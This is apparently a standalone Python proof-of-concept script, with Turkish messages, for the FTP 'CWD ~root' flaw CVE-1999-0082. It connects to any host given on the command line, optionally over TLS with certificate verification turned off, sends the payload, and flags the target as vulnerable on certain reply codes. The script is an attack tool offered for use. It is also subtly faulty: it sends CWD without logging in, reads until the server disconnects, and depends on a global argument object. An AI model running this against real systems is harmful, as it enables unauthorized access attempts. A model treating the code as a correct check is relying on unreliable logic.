import socket
import ssl
import argparse
import re
import time

# CVE-1999-0082: CWD ~root command in ftpd allows root access.
# This vulnerability allows remote attackers to gain root access by issuing the CWD command to navigate to the root user's directory.
# The exploit targets the FTP server that has weak directory traversal permissions, potentially allowing unauthorized root access.

def test_ftp_cwd_root_vuln(target_host, target_port=21, use_ssl=False, timeout=10, retries=3):
    # Example payload to exploit the CWD command vulnerability in FTP
    ftp_payload = "CWD ~root\r\n"
    
    for attempt in range(retries):
        try:
            with socket.create_connection((target_host, target_port), timeout=timeout) as sock:
                if use_ssl:
                    # Universal SSL Context to support both modern and legacy SSL/TLS
                    context = ssl.SSLContext(ssl.PROTOCOL_TLS)
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    try:
                        # Set the minimum TLS version if the system supports it
                        context.minimum_version = ssl.TLSVersion.TLSv1_2  # Ensure minimum TLS version is 1.2 if available
                        context.options |= ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_1  # Disable older TLS versions for compatibility
                        context.set_ciphers('ECDHE+AESGCM:ECDHE+CHACHA20:!aNULL:!MD5:!DSS')  # Use modern and compatible cipher suites
                    except AttributeError:
                        # Fallback for older systems that do not support minimum_version or options
                        pass
                    try:
                        with context.wrap_socket(sock, server_hostname=target_host) as ssock:
                            ssock.sendall(ftp_payload.encode())
                            response = b""
                            while True:
                                part = ssock.recv(4096)
                                if not part:
                                    break
                                response += part
                    except ssl.SSLError as ssl_error:
                        print(f"[-] SSL hatası oluştu: {ssl_error}")
                        continue
                else:
                    sock.sendall(ftp_payload.encode())
                    response = b""
                    while True:
                        part = sock.recv(4096)
                        if not part:
                            break
                        response += part
                
                response_str = response.decode(errors='replace')
                if args.verbose:
                    print(f"[i] Sunucudan gelen yanıt: {response_str}")
                
                if re.search(r"230 User logged in|250 Directory successfully changed", response_str):
                    print(f"[+] ({attempt + 1}/{retries}) Hedef sistem potansiyel olarak CVE-1999-0082 zafiyetine sahip olabilir!")
                else:
                    print(f"[-] ({attempt + 1}/{retries}) Hedef sistemde zafiyet tespit edilemedi.")
                
                break
        except socket.timeout:
            print(f"[-] ({attempt + 1}/{retries}) Hedefe bağlanma süresi doldu. Bağlantı zaman aşımına uğradı.")
        except ssl.SSLError as e:
            print(f"[-] ({attempt + 1}/{retries}) SSL hatası oluştu: {e}")
        except socket.error as e:
            print(f"[-] ({attempt + 1}/{retries}) Hedefe bağlanırken bir hata oluştu: {e}")
        
        # Eğer bağlantı başarısız olursa, biraz bekleyip tekrar deneyelim.
        if attempt < retries - 1:
            time.sleep(3)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="PoC script for FTP CWD ~root Command CVE-1999-0082")
    parser.add_argument("-t", "--target", required=True, help="Hedef sunucu IP adresi veya hostname")
    parser.add_argument("-p", "--port", type=int, default=21, help="Hedef sunucu port numarası (varsayılan: 21, FTP için)")
    parser.add_argument("-s", "--ssl", action="store_true", help="SSL/TLS kullanarak bağlan (FTPS için)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Detaylı çıktı")
    parser.add_argument("--timeout", type=int, default=10, help="Bağlantı zaman aşımı süresi (saniye olarak, varsayılan: 10)")
    parser.add_argument("--retries", type=int, default=3, help="Başarısız bağlantılar için tekrar deneme sayısı (varsayılan: 3)")
    
    args = parser.parse_args()
    
    if args.verbose:
        print(f"[i] Hedef: {args.target}, Port: {args.port}, SSL: {args.ssl}, Timeout: {args.timeout}, Retries: {args.retries}")
    
    test_ftp_cwd_root_vuln(args.target, args.port, use_ssl=args.ssl, timeout=args.timeout, retries=args.retries)